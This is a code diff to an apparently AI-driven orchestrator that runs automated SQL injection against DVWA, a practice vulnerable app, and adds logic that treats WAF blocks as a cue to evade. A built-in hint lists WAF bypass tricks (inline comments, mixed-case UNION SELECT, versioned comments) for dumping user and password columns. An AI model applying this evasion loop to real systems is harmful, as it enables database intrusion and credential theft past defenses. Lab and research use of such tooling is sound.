@@ -75,7 +75,11 @@ class Orchestrator:
         while step < max_steps and (time.monotonic() - start) < timeout_seconds:
             step += 1
             candidate = candidates[idx] if idx < len(candidates) else ""
-            history = "; ".join(f"#{a.step} {a.payload!r}->{a.analysis.get('assessment', '')}" for a in attempts[-4:])
+            history = "; ".join(
+                f"#{a.step} {a.payload!r}->"
+                + ("WAF-BLOCKED" if a.response.blocked else a.analysis.get("assessment", ""))
+                for a in attempts[-4:]
+            )
 
             crafted = self.executor.craft(level, strategy, candidate, history, hint)
             payload = str(crafted.get("payload") or _candidate_payload(candidate)).strip()
@@ -85,6 +89,8 @@ class Orchestrator:
             say(f"[Executor] step {step}: {payload!r}")
 
             response = self.dvwa.run_sqli(payload, level)
+            if response.blocked:
+                say(f"[WAF] blocked (HTTP {response.http_status}) — payload rejected, must evade")
             analysis = self.analyst.analyze(level, payload, response)
             attempts.append(Attempt(step, payload, str(crafted.get("reason", "")), response, analysis))
             say(f"[Analyst] {analysis.get('assessment', '')} -> {analysis.get('next_action', '')}")
@@ -100,7 +106,17 @@ class Orchestrator:
                 break
 
             hint = str(analysis.get("hint", ""))
-            if analysis.get("next_action") == "replan":
+            next_action = analysis.get("next_action")
+            if response.blocked:
+                # A WAF block is never a dead end for the strategy — it means the signature was
+                # caught, so force a re-plan with evasion regardless of the analyst's verdict.
+                next_action = "replan"
+                hint = hint or (
+                    "WAF blocked the payload (HTTP 403). Keep the same 2-column UNION that dumps "
+                    "user,password but obfuscate it: inline comments /**/ between keywords, mixed "
+                    "case (uNiOn SeLeCt), UNION ALL, versioned comments /*!50000...*/, or # instead of -- -."
+                )
+            if next_action == "replan":
                 plan = self.planner.plan(level, feedback=hint or "previous payloads failed")
                 strategy = str(plan.get("strategy", strategy))
                 candidates = plan.get("payloads") or candidates
